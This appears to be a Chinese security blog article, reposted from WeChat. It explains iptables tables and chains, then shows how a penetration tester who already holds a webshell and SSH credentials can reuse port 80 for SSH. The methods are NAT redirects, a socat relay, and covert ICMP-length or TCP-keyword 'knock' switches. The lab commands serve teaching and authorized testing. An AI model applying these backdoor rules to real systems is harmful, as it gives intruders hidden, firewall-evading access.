<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Ri1poaoc2Vkr8JyWQDzA3w)

![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif)

> **文章来源 ：系统安全运维**

**iptables 基础**

我们自定义的所有规则，都是这四种分类中的规则，或者说，所有规则都存在于这 4 张” 表” 中

**#1** **主动**

包含 4 个表：4 个表的优先级由高到低：raw-->mangle-->nat-->filter

**#1.1** **raw**

RAW 表只使用在 PREROUTING 链和 OUTPUT 链上, 因为优先级最高，从而可以对收到的数据包在连接跟踪前进行处理。一但用户使用了 RAW 表, 在某个链上, RAW 表处理完后, 将跳过 NAT 表和 ip_conntrack 处理, 即不再做地址转换和数据包的链接跟踪处理了

****#1.2** **mangle****

此规则表拥有 prerouting、FORWARD、postrouting 三个规则链，除了进行网址转译工作会改写封包外，在某些特殊应用可能也必须去改写封包 (ITL、TOS) 或者是设定 MARK(将封包作记号，以进行后续的过滤)这时就必须将这些工作定义在 mangles 规则表中

******#1.3** **nat******

此规则表拥有 prerouting 和 postrouting 两个规则链， 主要功能为进行一对一、一对多、多对多等网址转译工作（SNATDNAT）

********#1.4** **filter********

这个规则表是预设规则表，拥有 INPUT、FORWARD 和 OUTPUT 三个规则链; 负责过滤功能，防火墙；内核模块：iptables_filter

****#2**** **常用命令和参数**

```
举例：iptables -t nat -A PREROUTING -p tcp -s 192.168.152.250 --dport 80 -j REDIRECT --to-port 22

常用命令：-A 追加规则-->iptables -A INPUT
-D 删除规则-->iptables -D INPUT 1(编号)
-R 修改规则-->iptables -R INPUT 1 -s 192.168.12.0 -j DROP 取代现行规则，顺序不变(1是位置)
-I 插入规则-->iptables -I INPUT 1 --dport 80 -j ACCEPT 插入一条规则，原本位置上的规则将会往后移动一个顺位
-L 查看规则-->iptables -L INPUT 列出规则链中的所有规则
-N 新的规则-->iptables -N allowed 定义新的规则
-t 指定nat就看nat表信息，不用-t 默认filter表
-n 使输出中的IP地址和端口以数值的形式显示
-V 输出详细化
--line 显示出每条规则在相应链中的序号
通用参数：-p 协议  例：iptables -A INPUT -p tcp
-s源地址 例：iptables -A INPUT -s 192.168.1.1
-d目的地址 例：iptables -A INPUT -d 192.168.12.1
-sport源端口 例:iptables -A INPUT -p tcp --sport 22
-dport目的端口 例:iptables -A INPUT -p tcp --dport 22
-i指定入口网卡 例:iptables -A INPUT -i eth0
-o指定出口网卡 例:iptables -A FORWARD -o eth0
```

******#2.1 举例******

```
iptables -t nat -nL --line
```

![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmX06et8uCm7eIw7Yc0OFbWeAsHkQialqicTkbODpojCjSDUibFfDDVm6e62uzqbiaA2icN50fKAB84IkA/640?wx_fmt=png)

**注释：**

PREROUTING 链：PREROUTING 链的作用是在包刚刚到达防火墙时改变它的目的地址，是从外部连接过来时的转发

OUTPUT 链：OUTPUT 链改变本地产生的包的目的地址，是本机连接时的转发

POSTROUTING 链：POSTROUTING 链在包就要离开防火墙之前改变其源地址

  

**利用情况**

在做渗透测试的过程中，我们经常会遇到下面这种问题:

目标主机是 Linux 系统，目标主机防火墙有严格的限制，只允许 80 端口的流量进入。我们拿到了目标主机的 Webshell 并且拿到了 SSH 的账号密码，但因为防火墙限制不能连接 22 端口，这时就需要利用 80 端口做端口复用连接。

现在我们的思路就是利用 Linux 的 iptables 防火墙的 nat 表的 PREROUTING 链做端口复用，因为 nat 表的 PREROUTING 链会在路由决策之前被处理  

**实际利用**

**![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmX06et8uCm7eIw7Yc0OFbWrNXmdMsticgwbtRHXTx5MzIdK7443HRn6QzO0XctMuReZekroFDK0xQ/640?wx_fmt=png)**  

Kali：192.168.152.250

目标机：192.168.152.135

**#1** **根据源地址做端口复用**

****#1********.1**** **目标机执行以下命令**

```
iptables -t nat -A PREROUTING -p tcp -s 192.168.152.250 --dport 80 -j REDIRECT --to-port 22 //将192.168.152.250访问80端口的流量都重定向到22端口
iptables -t nat -nvL //查看规则
```

**![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmX06et8uCm7eIw7Yc0OFbWll9eLAbSl0iaGbH0sXzETcuVJSczvU5WdrO2nDKTcrGxww0VicbLd3CA/640?wx_fmt=png)******#1********.2**********kali 上执行命令******

```
ssh -p 80 root@192.168.152.135
```

![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmX06et8uCm7eIw7Yc0OFbWBVGSTUIee1NvbGuMH24wNsWsMUNEBBQPqk0X3MfYt6FxWe06Q27RSA/640?wx_fmt=png)****#1********.3**** ****缺点****

访问目标主机 80 端口的流量都会被转给 22 端口，所以 HTTP 服务无法访问

![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmX06et8uCm7eIw7Yc0OFbWJmg5MLgzp3iaTQRicBs5alaESZYZo3cZPmLnUDjia1cicTEEfSASQiafxGw/640?wx_fmt=png)

**#2** **根据源地址做端口复用**

****#2********.1**** **目标机执行以下命令**

```
iptables -t nat -A PREROUTING -p tcp -s 192.168.152.250 --sport 5555 --dport 80 -j REDIRECT --to-port 22 //指定来自192.168.152.250主机的5555端口访问80端口的流量才会被转给22端口 
iptables -t nat -nvL
```

![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmX06et8uCm7eIw7Yc0OFbW7GibLIb3k7ZB0UTcZTTiaeuGrJQ55UHhqrfbV9XJsiaazLdeHT8uLMA1w/640?wx_fmt=png)

******#2********.2********kali 上执行命令**

用 socat 将本地 4444 端口的流量以源端口 5555 访问 192.168.152.135:80，然后 SSH 本地的 4444 端口即可

```
nohup socat tcp-listen:4444,fork,reuseaddr tcp:192.168.152.135:80,sourceport=5555,reuseaddr
```

![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmX06et8uCm7eIw7Yc0OFbWBTiaibRicWxrYpibk038toKvn6AhvmHJMcBichI96GOmao3iaibUT84FYHicSA/640?wx_fmt=png)

```
ssh -p 4444 root@127.0.0.1
```

![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmX06et8uCm7eIw7Yc0OFbWSyEWpBzICyichP4ar9phlZWngZl8yg6bqIzRep2g5Eu05LEUOpNP1lA/640?wx_fmt=png)****#2********.3**** **缺点**

不支持多连接 如果想创建两个 SSH 连接就会出错，因为本地的 5555 端口已经被第一个 SSH 连接占用了

**#3** **利用 ICMP 协议做遥控开关**

****#3.1**** **创建端口复用链及规则**

```
iptables -t nat -N LETMEIN //创建端口复用链 
iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22 //创建端口复用规则，将流量转发至 22 端口 
iptables -t nat -nvL
```

![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmX06et8uCm7eIw7Yc0OFbWAEA88mnZmJAAwIeBL2pXVa1KoJaHlB7U7b6GqL1qcfRe6x9nbOicoKA/640?wx_fmt=png)

****#3.2**** **创建开关**

```
iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length 1028 -m recent --set --name letmein --rsource -j ACCEPT //开启开关，如果接收到一个长为 1139 的 ICMP 包，则将来源 IP 添加到加为letmein的列表中 
iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length 1029 -m recent --name letmein --remove -j ACCEPT //关闭开关，如果接收到一个长为 1140 的 ICMP 包，则将来源 IP 从 letmein 列表中去掉 
iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN //如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒
```

**![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmX06et8uCm7eIw7Yc0OFbWEdgeIQjOrKoP0qTOic1ANlN8ORQNsiaPkf87aQbxKVuwsNkOPENPJYmA/640?wx_fmt=png)**  

****#3.3******kali 上执行命****令**

开启复用

```
ping -c 1 -s 1000 192.168.152.135 //向目标发送一个长度为 1000 的 ICMP 数据包（加上包头28，总长度实际为1028,对应上上面设置的开启长度1028）
```

![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmX06et8uCm7eIw7Yc0OFbWWcUVq8kCBTV0hiax43jCM0spUPW1kXKoNYMtge9m37qKEccs5wP4vBw/640?wx_fmt=png)

关闭复用

```
ping -c 1 -s 1001 192.168.152.135 //向目标发送一个长度为 1001 的 ICMP 数据包（加上包头28，总长度实际为1029,对应上上面设置的关闭长度1029）
```

**![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmX06et8uCm7eIw7Yc0OFbWpuMjROoHAsN9nSGAFCnKmwUiasXOpWFqUZZUlAfQkiaH0ORgPcW3cMXQ/640?wx_fmt=png)******#3********.4**** **缺点******

如果目标在内网，你是无法直接 ping 到它的

**********#4********** ****利用 TCP 协议做遥控开关****

利用 tcp 数据包中的关键字做遥控开关，不怕目标在内网

********#4********.1******** ****创建端口复用链及规则****

```
iptables -t nat -N LETMEIN //创建端口复用链
iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22 //创建端口复用规则，将流量转发至 22 端口 
iptables -t nat -nvL
```

![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmX06et8uCm7eIw7Yc0OFbWWBTbjqcrFp3z8G6d28icE6vtKdibTwktPPf5DGQ3DBXJoFDECkND8yqg/640?wx_fmt=png)

**********#4********.2******** **创建开关****

```
iptables -A INPUT -p tcp -m string --string 'go' --algo bm -m recent --set --name letmein --rsource -j ACCEPT //开启开关，如果接收到一个含有 go 的TCP包，则将来源 IP 添加到加为letmein的列表中 
iptables -A INPUT -p tcp -m string --string 'out' --algo bm -m recent --name letmein --remove -j ACCEPT //关闭开关，如果接收到一个含有 out 的TCP包，则将来源 IP 从letmein的列表中移除 
iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN //如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒
```

![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmX06et8uCm7eIw7Yc0OFbWZeU0iaHu7zhsib9cPa8SEiclO6GT2MEnfWia0TXYkBQfzIBjahVBibPtITQ/640?wx_fmt=png)

************#4********.3**********kali 上执行命令******

开启复用

```
echo go | socat - tcp:192.168.152.135:80
```

![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmX06et8uCm7eIw7Yc0OFbWPicyia3xZG4ysd8mPiclbiaicKKO7CE7ic4yC8x6cT3DiaA2fzFe7oiaVVCfWg/640?wx_fmt=png)  

关闭复用  

```
echo out | socat - tcp:192.168.152.135:80
```

![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmX06et8uCm7eIw7Yc0OFbWpchf0KVLYnLxF6cpmSiaib58fmQQdkSCuBQ1y8n9Jd1r3oG0mOM36VQg/640?wx_fmt=png)

**侵权请私聊公众号删文**

![](https://mmbiz.qpic.cn/mmbiz_jpg/3xxicXNlTXLicjiasf4mjVyxw4RbQt9odm9nxs9434icI9TG8AXHjS3Btc6nTWgSPGkvvXMb7jzFUTbWP7TKu6EJ6g/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLib0FWIDRa9Kwh52ibXkf9AAkntMYBpLvaibEiaVibzNO1jiaVV7eSibPuMU3mZfCK8fWz6LicAAzHOM8bZUw/640?wx_fmt=jpeg)  

![](https://mmbiz.qpic.cn/mmbiz_gif/NZycfjXibQzlug4f7dWSUNbmSAia9VeEY0umcbm5fPmqdHj2d12xlsic4wefHeHYJsxjlaMSJKHAJxHnr1S24t5DQ/640?wx_fmt=gif)